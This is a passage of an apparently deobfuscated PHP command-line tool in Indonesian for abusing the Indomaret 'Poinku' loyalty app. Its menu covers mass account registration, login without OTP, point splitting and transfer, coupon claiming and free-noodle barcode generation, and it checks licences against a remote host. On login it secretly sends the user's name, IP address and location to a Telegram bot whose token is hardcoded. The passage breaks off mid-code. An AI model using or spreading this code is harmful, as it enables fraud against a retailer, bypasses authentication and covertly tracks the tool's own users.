?>
?><?php 
$uuid = shell_exec("whoami");
$clear = shell_exec("clear");
echo $clear;
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");
h8G8Y:
$unXYW = "/storage/emulated/0/Android";
if (!(is_dir($unXYW) === false)) {
    goto BuRXH;
}
mkdir("/storage/emulated/0/Android", 0777, true);
BuRXH:
$IBJ55 = trim(file_get_contents("https://irfan.iproute.my.id/ipoinx/medansi/poinnew"));
if (!($IBJ55 == '')) {
    goto CAy8f;
}
@unlink("/storage/emulated/0/Android/your");
CAy8f:
$aoIfK = @file_get_contents("/storage/emulated/0/Android/your");
if (!($aoIfK == '')) {
    goto Jrt89;
}
echo @Zm6iC("green", "Masukkan Password Device Anda : ");
$aoIfK = trim(fgets(STDIN));
M20ZQ("your", $aoIfK);
Jrt89:
echo @zm6Ic("nevy", "Proses Verifikasi Device ID, Mohon Tunggu ..");
sleep(2);
$eqo_P = @file_get_contents("whoami");
echo "\n";
$Jst1j = $aoIfK;
$Gukt8 = $eqo_P;
if (password_verify($Gukt8, $Jst1j)) {
    echo @zM6iC("yellow", "Berhasil Login");
    echo "\n";
    nNgh2:
    $IKJzx = array(file_get_contents("https://irfan.iproute.my.id/ipoinx/medansi/ppp"));
    $H1g60 = json_encode($IKJzx, true);
    $efQM2 = count($IKJzx) - 1;
    $zvt88 = $IKJzx;
    $tqWr2 = $zvt88[0];
    $rVPVc = @file_get_contents("poin");
    if (!($rVPVc == '')) {
        goto xbrV2;
    }
    @unlink("poin");
    echo "\n";
    echo @zm6ic("nevy", "Masukkan Username Mu  : ");
    $rVPVc = trim(fgets(STDIN));
    R1QlS("poin", $rVPVc);
    xbrV2:
    $jTEU0 = "0";
    $S8W9D = "500";
    $jTEU0;
    bvf0h:
    if (!($jTEU0 < $S8W9D)) {
        goto fzpTX;
    }
    $zcN5u = xoZB4(array("\n"), $tqWr2)[$jTEU0];
    $U0YgX = str_replace("\r", '', $zcN5u);
    $zn5zd = $U0YgX;
    if (!($zn5zd == $rVPVc)) {
        $jTEU0++;
        goto bvf0h;
    }
    if ($rVPVc == '') {
        goto fzpTX;
    }
    if (!($zn5zd == '')) {
        echo "\n";
        echo @Zm6ic("purple", "Kamu Login dengan Username {$zn5zd}");
        $IKJzx = array(file_get_contents("https://irfan.iproute.my.id/ipoinx/medansi/keram"));
        $H1g60 = json_encode($IKJzx, true);
        $efQM2 = count($IKJzx) - 1;
        $zvt88 = $IKJzx;
        $tqWr2 = $zvt88[0];
        $Tvjlw = rand(0, 890);
        $zcN5u = Xozb4(array("\n"), $tqWr2)[$Tvjlw];
        $PGTBJ = str_replace("\r", '', $zcN5u);
        $gIJCo = xuUln($PGTBJ);
        $gIJCo = json_decode($gIJCo, true);
        $ae0GJ = @$gIJCo["ip"];
        $jcXSt = @$gIJCo["geo"];
        $egras = "5553166883:AAH-PUR2AQcNBi-UETHM2_-coBaua9Q1ja4";
        $Er7r7 = "1069319412";
        $YXsOG = "Username   \"{$zn5zd}\"   Telah Login Ke Script IDM POINKU Terbaru di IP = " . $ae0GJ . " Lokasi = " . $jcXSt . ".. !!";
        $m9N4q = "sendMessage";
        $lEbop = "https://api.telegram.org/bot5553166883:AAH-PUR2AQcNBi-UETHM2_-coBaua9Q1ja4/sendMessage";
        $z5CDs = ["chat_id" => $Er7r7, "text" => $YXsOG];
        $ruc3h = ["X-Requested-With: XMLHttpRequest", "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"];
        $C6npe = curl_init();
        curl_setopt($C6npe, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($C6npe, CURLOPT_URL, $lEbop);
        curl_setopt($C6npe, CURLOPT_HTTPHEADER, $ruc3h);
        curl_setopt($C6npe, CURLOPT_POSTFIELDS, $z5CDs);
        curl_setopt($C6npe, CURLOPT_SSL_VERIFYPEER, false);
        $zy8D_ = curl_exec($C6npe);
        $C04ya = curl_error($C6npe);
        $EghiE = curl_getinfo($C6npe, CURLINFO_HTTP_CODE);
        curl_close($C6npe);
        $mYT0v["text"] = $YXsOG;
        $mYT0v["respon"] = json_decode($zy8D_, true);
        echo "\n";
        echo "\n";
        $IBJ55 = trim(file_get_contents("https://irfan.iproute.my.id/ipoinx/medansi/poinnew"));
        if (!($IBJ55 == '')) {
            goto h93oq;
        }
        @unlink("beat");
        @unlink("more");
        h93oq:
        $r99Ty = date("Y-m-d");
        $fUekS = trim(file_get_contents("https://irfan.iproute.my.id/ipoinx/medansi/poinmastif"));
        if (!($fUekS == '')) {
            $Jzh8Y = strtotime("+7 days", strtotime($fUekS));
            $Z3FW0 = date("Y-m-d", $Jzh8Y);
            if ($r99Ty >= $Z3FW0) {
                echo @ZM6Ic("red", "Script Expired, Hubungi Creator https://wa.me/6282176358295\n");
                die;
            }
            echo @ZM6IC("green", "Masih dalam jangka waktu, Jika Expired Hubungi Creator!!");
            echo "\n";
            echo exec("clear");
            echo @zM6iC("purple", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
            $wd9cN = date("d-m-Y | H:i:s");
            echo @Zm6ic("nevy", $wd9cN);
            echo @zm6Ic("green", "  | WA 082176358295 \n");
            echo @Zm6ic("yellow", "\t\tBuild By FERDY RAMADHAN\n");
            echo @ZM6IC("yellow", "\t\t   SC GARAPAN IDM POINKU\n");
            echo @ZM6ic("red", "   Please Verify Your Device First ^^\n");
            echo @zM6Ic("purple", "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
            $Pud0o = trim(file_get_contents("https://irfan.iproute.my.id/ipoinx/medansi/poinkey"));
            if (!($Pud0o == '')) {
                goto QcsI1;
            }
            @unlink("beat");
            QcsI1:
            $Y_a4j = trim(file_get_contents("https://irfan.iproute.my.id/ipoinx/medansi/poinkey"));
            if (!($Y_a4j == '')) {
                goto J2_16;
            }
            @unlink("more");
            J2_16:
            k9jad:
            $aoIfK = @file_get_contents("more");
            if (!($aoIfK == '')) {
                goto uY9IY;
            }
            echo @ZM6Ic("green", "Masukkan Password Device Anda : ");
            $aoIfK = trim(fgets(STDIN));
            r1qLS("more", $aoIfK);
            uY9IY:
            echo @ZM6iC("nevy", "Proses Verifikasi Device ID, Mohon Tunggu ..");
            sleep(2);
            $eqo_P = @file_get_contents("beat");
            echo "\n";
            $Jst1j = $aoIfK;
            $Gukt8 = $eqo_P;
            if (password_verify($Gukt8, $Jst1j)) {
                echo @ZM6Ic("yellow", "Berhasil Login");
                echo "\n";
                pfdwZ:
                $LD6vG = trim(file_get_contents("https://irfan.iproute.my.id/ipoinx/medansi/poinmot"));
                if (!($LD6vG == '')) {
                    Q7LGl:
                    echo @zM6iC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                    $wd9cN = date("d-m-Y | H:i:s");
                    echo @zM6IC("green", $wd9cN);
                    echo @zM6iC("nevy", " | Script IDM POINKU\n");
                    echo @zM6ic("yellow", "Build By FERDY RAMADHAN ");
                    echo @Zm6iC("yellow", "| WA 082176358295 \n");
                    echo @ZM6iC("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                    echo @Zm6Ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                    echo @Zm6IC("nevy", "\t\t\t\tAAMIIN ");
                    echo @zM6iC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                    echo @Zm6iC("nevy", "Mau Pilih Opsi Mana ? : \n");
                    echo @ZM6IC("yellow", " 1  . Regist Poinku + Pecahin\n");
                    echo @zM6IC("yellow", " 2  . Login Poinku Tanpa OTP + Pecahin\n");
                    echo @zM6IC("yellow", " 3  . Login Poinku + Cek Kupon\n");
                    echo @Zm6Ic("yellow", " 4  . Register Poinku\n");
                    echo @zM6IC("yellow", " 5  . Tukar Poin\n");
                    echo @ZM6iC("yellow", " 6  . Regist Poinku Otomatis\n");
                    echo @zM6IC("yellow", " 7  . Generate Token Pembayaran\n");
                    echo @zm6ic("yellow", " 8  . Pecah Ayam Masal\n");
                    echo @ZM6Ic("yellow", " 9  . Generate Token Akses\n");
                    echo @ZM6iC("yellow", " 10 . Cek Poin Mu\n");
                    echo @zm6IC("yellow", " 11 . Bikin Barcode Mie\n");
                    echo @zm6ic("yellow", " 12 . Claim Kupon\n");
                    echo @zM6iC("yellow", " 13 . Tukar Stamp\n");
                    echo @Zm6iC("yellow", " 14 . Tambah Alamat\n");
                    echo @zm6ic("yellow", " 15 . Cek Alamat Akun\n");
                    echo @zm6IC("yellow", " 16 . Pecah Kado / BIJI \n");
                    echo @ZM6Ic("yellow", " 17 . Misah Poin \n");
                    echo @zm6iC("green", "Pilih : ");
                    $cPDPt = trim(fgets(STDIN));
                    echo "\n";
                    if (!($cPDPt == 1)) {
                        if (!($cPDPt == 2)) {
                            goto kQ7gd;
                        }
                        echo @zm6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                        $wd9cN = date("d-m-Y | H:i:s");
                        echo @ZM6IC("green", $wd9cN);
                        echo @zm6IC("nevy", " | Script IDM LOGIN POINKU TANPA OTP\n");
                        echo @ZM6IC("yellow", "Build By FERDY RAMADHAN ");
                        echo @Zm6IC("yellow", "| WA 082176358295 \n");
                        echo @ZM6Ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                        echo @zM6IC("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                        echo @zM6iC("nevy", "\t\t\t\tAAMIIN ");
                        echo @zm6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                        echo "\n";
                        $QRhbE = explode("\n", @file_get_contents("forceclose"));
                        $efQM2 = count($QRhbE) - 1;
                        $zvt88 = $QRhbE;
                        echo "\n";
                        $yy9BI = "0";
                        echo "\n";
                        $DxrJr = "100000000000000000";
                        $yy9BI;
                        hJDqH:
                        if (!($yy9BI < $DxrJr)) {
                            goto RM7sw;
                        }
                        $QRhbE = explode("\n", @file_get_contents("mytoken"));
                        $efQM2 = count($QRhbE) - 1;
                        $zvt88 = $QRhbE;
                        $tqWr2 = $zvt88[$yy9BI];
                        $zcN5u = xOZB4(array("|"), $tqWr2)[0];
                        if (!($zcN5u == '')) {
                            echo $yy9BI . ". ";
                            print_r($zcN5u);
                            echo "\n";
                            $yy9BI++;
                            goto hJDqH;
                        }
                        RM7sw:
                        echo "\n";
                        echo "Mulai Baris Ke  : ";
                        $jTEU0 = trim(fgets(STDIN));
                        echo "\n";
                        echo "Sampai Baris Ke : ";
                        $S8W9D = trim(fgets(STDIN));
                        $jTEU0;
                        e81aM:
                        if (!($jTEU0 < $S8W9D)) {
                            kQ7gd:
                            if (!($cPDPt == 3)) {
                                goto vRTIW;
                            }
                            echo @zM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                            $wd9cN = date("d-m-Y | H:i:s");
                            echo @ZM6Ic("green", $wd9cN);
                            echo @Zm6ic("nevy", " | Script IDM LOGIN POINKU CEK KUPON TANPA OTP\n");
                            echo @zM6Ic("yellow", "Build By FERDY RAMADHAN ");
                            echo @zm6ic("yellow", "| WA 082176358295 \n");
                            echo @zm6Ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                            echo @Zm6Ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                            echo @zm6iC("nevy", "\t\t\t\tAAMIIN ");
                            echo @zm6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                            echo "\n";
                            $QRhbE = explode("\n", @file_get_contents("forceclose"));
                            $efQM2 = count($QRhbE) - 1;
                            $zvt88 = $QRhbE;
                            echo "\n";
                            $yy9BI = "0";
                            echo "\n";
                            $DxrJr = "100000000000000000";
                            $yy9BI;
                            g2xJ9:
                            if (!($yy9BI < $DxrJr)) {
                                goto bI4pG;
                            }
                            $QRhbE = explode("\n", @file_get_contents("mytoken"));
                            $efQM2 = count($QRhbE) - 1;
                            $zvt88 = $QRhbE;
                            $tqWr2 = $zvt88[$yy9BI];
                            $zcN5u = Xozb4(array("|"), $tqWr2)[0];
                            if (!($zcN5u == '')) {
                                echo $yy9BI . ". ";
                                print_r($zcN5u);
                                echo "\n";
                                $yy9BI++;
                                goto g2xJ9;
                            }
                            bI4pG:
                            echo "\n";
                            echo "Mulai Baris Ke  : ";
                            $jTEU0 = trim(fgets(STDIN));
                            echo "\n";
                            echo "Sampai Baris Ke : ";
                            $S8W9D = trim(fgets(STDIN));
                            $jTEU0;
                            XUxU1:
                            if (!($jTEU0 < $S8W9D)) {
                                if (!($fUekS == '')) {
                                    vRTIW:
                                    if (!($cPDPt == 4)) {
                                        if (!($cPDPt == 5)) {
                                            goto m4_o3;
                                        }
                                        echo @Zm6iC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                        $wd9cN = date("d-m-Y | H:i:s");
                                        echo @zm6iC("green", $wd9cN);
                                        echo @zM6IC("nevy", " | Script IDM LOGIN POINKU CEK KUPON TANPA OTP\n");
                                        echo @ZM6IC("yellow", "Build By FERDY RAMADHAN ");
                                        echo @zm6ic("yellow", "| WA 082176358295 \n");
                                        echo @Zm6Ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                        echo @Zm6ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                        echo @zm6Ic("nevy", "\t\t\t\tAAMIIN ");
                                        echo @ZM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                        echo "\n";
                                        $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                        $efQM2 = count($QRhbE) - 1;
                                        $zvt88 = $QRhbE;
                                        echo "\n";
                                        $yy9BI = "0";
                                        echo "\n";
                                        $DxrJr = "100000000000000000";
                                        $yy9BI;
                                        Fh1k_:
                                        if (!($yy9BI < $DxrJr)) {
                                            goto Eqo5q;
                                        }
                                        $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                        $efQM2 = count($QRhbE) - 1;
                                        $zvt88 = $QRhbE;
                                        $tqWr2 = $zvt88[$yy9BI];
                                        $zcN5u = XOZB4(array("|"), $tqWr2)[0];
                                        if (!($zcN5u == '')) {
                                            echo $yy9BI . ". ";
                                            print_r($zcN5u);
                                            echo "\n";
                                            $yy9BI++;
                                            goto Fh1k_;
                                        }
                                        Eqo5q:
                                        echo "\n";
                                        echo "Mulai Baris Ke  : ";
                                        $jTEU0 = trim(fgets(STDIN));
                                        echo "\n";
                                        echo "Sampai Baris Ke : ";
                                        $S8W9D = trim(fgets(STDIN));
                                        $jTEU0;
                                        Gr9uI:
                                        if (!($jTEU0 < $S8W9D)) {
                                            m4_o3:
                                            if (!($cPDPt == 6)) {
                                                if (!($cPDPt == 7)) {
                                                    goto UI83C;
                                                }
                                                echo @zm6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                $wd9cN = date("d-m-Y | H:i:s");
                                                echo @zM6iC("green", $wd9cN);
                                                echo @ZM6IC("nevy", " | Script IDM LOGIN POINKU TANPA OTP\n");
                                                echo @zM6Ic("yellow", "Build By FERDY RAMADHAN ");
                                                echo @ZM6ic("yellow", "| WA 082176358295 \n");
                                                echo @Zm6IC("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                echo @zm6IC("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                echo @Zm6IC("nevy", "\t\t\t\tAAMIIN ");
                                                echo @Zm6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                echo "\n";
                                                $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                $efQM2 = count($QRhbE) - 1;
                                                $zvt88 = $QRhbE;
                                                echo "\n";
                                                $yy9BI = "0";
                                                echo "\n";
                                                $DxrJr = "100000000000000000";
                                                $yy9BI;
                                                EPpoD:
                                                if (!($yy9BI < $DxrJr)) {
                                                    goto V9iZ0;
                                                }
                                                $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                $efQM2 = count($QRhbE) - 1;
                                                $zvt88 = $QRhbE;
                                                $tqWr2 = $zvt88[$yy9BI];
                                                $zcN5u = Xozb4(array("|"), $tqWr2)[0];
                                                if (!($zcN5u == '')) {
                                                    echo $yy9BI . ". ";
                                                    print_r($zcN5u);
                                                    echo "\n";
                                                    $yy9BI++;
                                                    goto EPpoD;
                                                }
                                                V9iZ0:
                                                echo "\n";
                                                echo "Mulai Baris Ke  : ";
                                                $jTEU0 = trim(fgets(STDIN));
                                                echo "\n";
                                                echo "Sampai Baris Ke : ";
                                                $S8W9D = trim(fgets(STDIN));
                                                $jTEU0;
                                                Pn_38:
                                                if (!($jTEU0 < $S8W9D)) {
                                                    UI83C:
                                                    if (!($cPDPt == 8)) {
                                                        goto ViQzv;
                                                    }
                                                    echo @zM6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                    $wd9cN = date("d-m-Y | H:i:s");
                                                    echo @zM6iC("green", $wd9cN);
                                                    echo @zM6Ic("nevy", " | Script IDM LOGIN POINKU TANPA OTP\n");
                                                    echo @ZM6Ic("yellow", "Build By FERDY RAMADHAN ");
                                                    echo @ZM6Ic("yellow", "| WA 082176358295 \n");
                                                    echo @Zm6Ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                    echo @zM6Ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                    echo @zm6ic("nevy", "\t\t\t\tAAMIIN ");
                                                    echo @zm6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                    echo "\n";
                                                    $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                    $efQM2 = count($QRhbE) - 1;
                                                    $zvt88 = $QRhbE;
                                                    echo "\n";
                                                    $yy9BI = "0";
                                                    echo "\n";
                                                    $DxrJr = "100000000000000000";
                                                    $yy9BI;
                                                    zYvyA:
                                                    if (!($yy9BI < $DxrJr)) {
                                                        goto tZ3WW;
                                                    }
                                                    $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                    $efQM2 = count($QRhbE) - 1;
                                                    $zvt88 = $QRhbE;
                                                    $tqWr2 = $zvt88[$yy9BI];
                                                    $zcN5u = XozB4(array("|"), $tqWr2)[0];
                                                    if (!($zcN5u == '')) {
                                                        echo $yy9BI . ". ";
                                                        print_r($zcN5u);
                                                        echo "\n";
                                                        $yy9BI++;
                                                        goto zYvyA;
                                                    }
                                                    tZ3WW:
                                                    echo "\n";
                                                    echo "Mulai Baris Ke  : ";
                                                    $jTEU0 = trim(fgets(STDIN));
                                                    echo "\n";
                                                    echo "Sampai Baris Ke : ";
                                                    $S8W9D = trim(fgets(STDIN));
                                                    $jTEU0;
                                                    MN2hd:
                                                    if (!($jTEU0 < $S8W9D)) {
                                                        ViQzv:
                                                        if (!($cPDPt == 9)) {
                                                            goto ZjzxQ;
                                                        }
                                                        echo @ZM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                        $wd9cN = date("d-m-Y | H:i:s");
                                                        echo @zM6ic("green", $wd9cN);
                                                        echo @ZM6ic("nevy", " | Script IDM LOGIN POINKU TANPA OTP\n");
                                                        echo @zM6Ic("yellow", "Build By FERDY RAMADHAN ");
                                                        echo @Zm6iC("yellow", "| WA 082176358295 \n");
                                                        echo @Zm6ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                        echo @zM6IC("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                        echo @zM6Ic("nevy", "\t\t\t\tAAMIIN ");
                                                        echo @zM6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                        echo "\n";
                                                        echo @zm6ic("red", "Apakah Yakin Generate New Token? ( y / n ) : ");
                                                        $DNueE = trim(fgets(STDIN));
                                                        if ($DNueE == "y") {
                                                            CV2DM:
                                                            echo "\n";
                                                            @unlink("mytoken");
                                                            $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                            $efQM2 = count($QRhbE) - 1;
                                                            $zvt88 = $QRhbE;
                                                            echo "\n";
                                                            print_r($zvt88);
                                                            echo "\n";
                                                            echo "Mulai Baris Ke  : ";
                                                            $jTEU0 = trim(fgets(STDIN));
                                                            echo "\n";
                                                            echo "Sampai Baris Ke : ";
                                                            $S8W9D = trim(fgets(STDIN));
                                                            $jTEU0;
                                                            ODvt2:
                                                            if (!($jTEU0 < $S8W9D)) {
                                                                ZjzxQ:
                                                                if (!($cPDPt == 10)) {
                                                                    goto XfMNS;
                                                                }
                                                                echo @ZM6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                $wd9cN = date("d-m-Y | H:i:s");
                                                                echo @zM6ic("green", $wd9cN);
                                                                echo @ZM6IC("nevy", " | Script IDM Cek Poin\n");
                                                                echo @ZM6IC("yellow", "Build By FERDY RAMADHAN ");
                                                                echo @ZM6IC("yellow", "| WA 082176358295 \n");
                                                                echo @zM6ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                                echo @ZM6ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                                echo @ZM6IC("nevy", "\t\t\t\tAAMIIN ");
                                                                echo @zM6Ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                echo "\n";
                                                                $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                $efQM2 = count($QRhbE) - 1;
                                                                $zvt88 = $QRhbE;
                                                                echo "\n";
                                                                $yy9BI = "0";
                                                                echo "\n";
                                                                $DxrJr = "100000000000000000";
                                                                $yy9BI;
                                                                vCPy3:
                                                                if (!($yy9BI < $DxrJr)) {
                                                                    goto OQhff;
                                                                }
                                                                $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                                $efQM2 = count($QRhbE) - 1;
                                                                $zvt88 = $QRhbE;
                                                                $tqWr2 = $zvt88[$yy9BI];
                                                                $zcN5u = xOZb4(array("|"), $tqWr2)[0];
                                                                if (!($zcN5u == '')) {
                                                                    echo $yy9BI . ". ";
                                                                    print_r($zcN5u);
                                                                    echo "\n";
                                                                    $yy9BI++;
                                                                    goto vCPy3;
                                                                }
                                                                OQhff:
                                                                echo "\n";
                                                                echo "Mulai Baris Ke  : ";
                                                                $jTEU0 = trim(fgets(STDIN));
                                                                echo "\n";
                                                                echo "Sampai Baris Ke : ";
                                                                $S8W9D = trim(fgets(STDIN));
                                                                $jTEU0;
                                                                GGXBW:
                                                                if (!($jTEU0 < $S8W9D)) {
                                                                    XfMNS:
                                                                    if (!($cPDPt == 11)) {
                                                                        goto xCMQT;
                                                                    }
                                                                    echo @zM6iC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                    $wd9cN = date("d-m-Y | H:i:s");
                                                                    echo @Zm6Ic("green", $wd9cN);
                                                                    echo @ZM6Ic("nevy", " | Script IDM GENERATE BARCODE\n");
                                                                    echo @zm6Ic("yellow", "Build By FERDY RAMADHAN ");
                                                                    echo @ZM6iC("yellow", "| WA 082176358295 \n");
                                                                    echo @zm6Ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                                    echo @zm6Ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                                    echo @zM6Ic("nevy", "\t\t\t\tAAMIIN ");
                                                                    echo @zm6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                    echo "\n";
                                                                    $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                    $efQM2 = count($QRhbE) - 1;
                                                                    $zvt88 = $QRhbE;
                                                                    echo "\n";
                                                                    $yy9BI = "0";
                                                                    echo "\n";
                                                                    $DxrJr = "100000000000000000";
                                                                    $yy9BI;
                                                                    xB5XS:
                                                                    if (!($yy9BI < $DxrJr)) {
                                                                        goto wCiUR;
                                                                    }
                                                                    $QRhbE = explode("\n", @file_get_contents("GRATIS Indomie Mi Goreng!.txt"));
                                                                    $efQM2 = count($QRhbE) - 1;
                                                                    $zvt88 = $QRhbE;
                                                                    $tqWr2 = $zvt88[$yy9BI];
                                                                    $zcN5u = XOZB4(array("|"), $tqWr2)[0];
                                                                    if (!($zcN5u == '')) {
                                                                        echo $yy9BI . ". ";
                                                                        print_r($zcN5u);
                                                                        echo "\n";
                                                                        $yy9BI++;
                                                                        goto xB5XS;
                                                                    }
                                                                    wCiUR:
                                                                    echo "\n";
                                                                    echo "Mulai Baris Ke  : ";
                                                                    $jTEU0 = trim(fgets(STDIN));
                                                                    echo "\n";
                                                                    echo "Sampai Baris Ke : ";
                                                                    $S8W9D = trim(fgets(STDIN));
                                                                    $jTEU0;
                                                                    LRKWE:
                                                                    if (!($jTEU0 < $S8W9D)) {
                                                                        xCMQT:
                                                                        if (!($cPDPt == 12)) {
                                                                            goto TLXym;
                                                                        }
                                                                        echo @Zm6iC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                        $wd9cN = date("d-m-Y | H:i:s");
                                                                        echo @ZM6ic("green", $wd9cN);
                                                                        echo @zM6ic("nevy", " | Script IDM LOGIN POINKU TANPA OTP\n");
                                                                        echo @zm6IC("yellow", "Build By FERDY RAMADHAN ");
                                                                        echo @zm6iC("yellow", "| WA 082176358295 \n");
                                                                        echo @Zm6IC("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                                        echo @zM6Ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                                        echo @zM6ic("nevy", "\t\t\t\tAAMIIN ");
                                                                        echo @Zm6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                        echo "\n";
                                                                        $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                        $efQM2 = count($QRhbE) - 1;
                                                                        $zvt88 = $QRhbE;
                                                                        echo "\n";
                                                                        $yy9BI = "0";
                                                                        echo "\n";
                                                                        $DxrJr = "100000000000000000";
                                                                        $yy9BI;
                                                                        aOh1Q:
                                                                        if (!($yy9BI < $DxrJr)) {
                                                                            goto BGNon;
                                                                        }
                                                                        $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                                        $efQM2 = count($QRhbE) - 1;
                                                                        $zvt88 = $QRhbE;
                                                                        $tqWr2 = $zvt88[$yy9BI];
                                                                        $zcN5u = XozB4(array("|"), $tqWr2)[0];
                                                                        if (!($zcN5u == '')) {
                                                                            echo $yy9BI . ". ";
                                                                            print_r($zcN5u);
                                                                            echo "\n";
                                                                            $yy9BI++;
                                                                            goto aOh1Q;
                                                                        }
                                                                        BGNon:
                                                                        echo "\n";
                                                                        echo "Mulai Baris Ke  : ";
                                                                        $jTEU0 = trim(fgets(STDIN));
                                                                        echo "\n";
                                                                        echo "Sampai Baris Ke : ";
                                                                        $S8W9D = trim(fgets(STDIN));
                                                                        $jTEU0;
                                                                        CqA3L:
                                                                        if (!($jTEU0 < $S8W9D)) {
                                                                            TLXym:
                                                                            if (!($cPDPt == 13)) {
                                                                                goto eZaFp;
                                                                            }
                                                                            echo @ZM6iC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                            $wd9cN = date("d-m-Y | H:i:s");
                                                                            echo @Zm6Ic("green", $wd9cN);
                                                                            echo @ZM6iC("nevy", " | Script IDM LOGIN POINKU TANPA OTP\n");
                                                                            echo @Zm6Ic("yellow", "Build By FERDY RAMADHAN ");
                                                                            echo @zm6IC("yellow", "| WA 082176358295 \n");
                                                                            echo @zM6iC("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                                            echo @ZM6ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                                            echo @ZM6iC("nevy", "\t\t\t\tAAMIIN ");
                                                                            echo @ZM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                            echo "\n";
                                                                            $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                            $efQM2 = count($QRhbE) - 1;
                                                                            $zvt88 = $QRhbE;
                                                                            echo "\n";
                                                                            $yy9BI = "0";
                                                                            echo "\n";
                                                                            $DxrJr = "100000000000000000";
                                                                            $yy9BI;
                                                                            eM0mo:
                                                                            if (!($yy9BI < $DxrJr)) {
                                                                                goto lPFhp;
                                                                            }
                                                                            $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                                            $efQM2 = count($QRhbE) - 1;
                                                                            $zvt88 = $QRhbE;
                                                                            $tqWr2 = $zvt88[$yy9BI];
                                                                            $zcN5u = XoZb4(array("|"), $tqWr2)[0];
                                                                            if (!($zcN5u == '')) {
                                                                                echo $yy9BI . ". ";
                                                                                print_r($zcN5u);
                                                                                echo "\n";
